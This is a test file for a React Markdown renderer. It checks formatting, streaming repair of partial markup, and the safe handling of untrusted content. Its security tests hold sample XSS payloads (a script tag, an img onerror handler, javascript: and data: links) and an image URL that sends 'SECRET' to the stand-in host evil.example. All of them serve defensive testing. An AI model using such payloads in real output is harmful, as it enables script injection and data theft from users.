import { describe, expect, it, vi } from 'vitest'
import { render } from '@testing-library/react'
import MarkdownRenderer, { MAX_RENDERED_CHARS } from './MarkdownRenderer'
import RenderBoundary from './RenderBoundary'

function view(content: string, streaming = false) {
  return render(<MarkdownRenderer content={content} streaming={streaming} />).container
}

describe('MarkdownRenderer: formatting', () => {
  it('renders headings, emphasis, strikethrough, quotes and rules', () => {
    const c = view('# Title\n\n## Sub\n\n**bold** *it* ~~gone~~\n\n> quote\n\n---')
    expect(c.querySelector('h1')?.textContent).toBe('Title')
    expect(c.querySelector('h2')?.textContent).toBe('Sub')
    expect(c.querySelector('strong')?.textContent).toBe('bold')
    expect(c.querySelector('em')?.textContent).toBe('it')
    expect(c.querySelector('del')?.textContent).toBe('gone')
    expect(c.querySelector('blockquote')).not.toBeNull()
    expect(c.querySelector('hr')).not.toBeNull()
  })

  it('renders nested ordered and unordered lists', () => {
    const c = view('1. one\n   - inner\n2. two')
    expect(c.querySelectorAll('ol > li')).toHaveLength(2)
    expect(c.querySelector('ol ul li')?.textContent).toBe('inner')
  })

  it('renders tables inside a scroll wrapper', () => {
    const c = view('| Metric | Value |\n|---|---|\n| Accuracy | 95% |')
    expect(c.querySelector('table')).not.toBeNull()
    expect(c.querySelectorAll('th')).toHaveLength(2)
    expect(c.querySelector('td')?.textContent).toBe('Accuracy')
    expect(c.querySelector('table')?.parentElement?.className).toContain('overflow-x-auto')
  })

  it('renders task lists as disabled checkboxes', () => {
    const c = view('- [x] done\n- [ ] todo')
    const boxes = c.querySelectorAll('input[type=checkbox]')
    expect(boxes).toHaveLength(2)
    expect((boxes[0] as HTMLInputElement).checked).toBe(true)
    expect((boxes[1] as HTMLInputElement).disabled).toBe(true)
  })

  it('renders inline code and highlights fenced code', () => {
    const c = view('use `foo()`\n\n```python\ndef f():\n    return 1\n```')
    expect(c.querySelector('p code')?.textContent).toBe('foo()')
    expect(c.querySelector('pre code.language-python')).not.toBeNull()
    expect(c.querySelector('pre .hljs-keyword')).not.toBeNull()
  })

  it('keeps an unclosed fence as a code block while streaming', () => {
    const c = view('```js\nconst x = 1;', true)
    expect(c.querySelector('pre code')?.textContent).toContain('const x = 1;')
  })
})

describe('MarkdownRenderer: streaming', () => {
  it('closes dangling emphasis only while streaming', () => {
    expect(view('Result: **partial', true).querySelector('strong')?.textContent).toBe('partial')
    expect(view('Result: **partial', false).querySelector('strong')).toBeNull()
  })
})

describe('MarkdownRenderer: untrusted content', () => {
  it('never creates elements from raw HTML', () => {
    const c = view('<script>alert(1)</script><img src=x onerror=alert(2)><b>hi</b>')
    expect(c.querySelector('script')).toBeNull()
    expect(c.querySelector('img')).toBeNull()
    expect(c.querySelector('b')).toBeNull()
    expect(c.textContent).toContain('<script>')
  })

  it('drops javascript: and data: link targets', () => {
    const c = view('[a](javascript:alert(1)) [b](data:text/html;base64,PHNjcmlwdD4=)')
    for (const a of Array.from(c.querySelectorAll('a'))) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/^(javascript|data):/i)
    }
  })

  it('opens safe links in a new tab without opener or referrer', () => {
    const a = view('[docs](https://example.com/x)').querySelector('a')!
    expect(a.getAttribute('href')).toBe('https://example.com/x')
    expect(a.getAttribute('target')).toBe('_blank')
    expect(a.getAttribute('rel')).toBe('noopener noreferrer nofollow')
  })

  it('does not load remote images, it names them instead', () => {
    const c = view('![chart](https://evil.example/p.png?d=SECRET)')
    expect(c.querySelector('img')).toBeNull()
    expect(c.textContent).toContain('chart')
    expect(c.textContent).toContain('evil.example')
    expect(c.innerHTML).not.toContain('SECRET')
  })

  it('falls back to plain text above the size cap', () => {
    const big = '# h\n' + 'x'.repeat(MAX_RENDERED_CHARS + 1)
    const c = view(big)
    expect(c.querySelector('h1')).toBeNull()
    expect(c.textContent).toContain('too long to format')
    expect(c.textContent).toContain('# h')
  })
})

describe('RenderBoundary', () => {
  it('shows the fallback instead of crashing', () => {
    const Boom = () => {
      throw new Error('boom')
    }
    const spy = vi.spyOn(console, 'error').mockImplementation(() => {})
    const { container } = render(
      <RenderBoundary fallback={<p>raw text</p>}>
        <Boom />
      </RenderBoundary>
    )
    spy.mockRestore()
    expect(container.textContent).toBe('raw text')
  })
})
